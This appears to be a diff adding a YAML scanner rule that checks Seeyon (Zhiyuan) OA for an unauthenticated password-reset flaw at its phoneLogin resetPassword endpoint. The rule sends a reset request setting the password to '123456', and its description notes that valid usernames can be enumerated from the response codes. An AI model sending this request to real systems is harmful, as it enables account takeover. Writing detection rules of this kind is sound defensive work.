@@ -1,0 +1,17 @@
+name: 致远OA-phoneLogin-密码重置
+description: >-
+  用户不存在时回显json字段code为500,用户存在回显code为4,需遍历用户名
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /seeyon/rest/phoneLogin/phoneCode/resetPassword
+    headers:
+      Content-Type: application/json
+    body: >-
+      {"loginName":"Rscan","password":"123456"}
+    expression:
+      status: 500
+      headers:
+        Content-Type: json
+      body_all: ["500"]
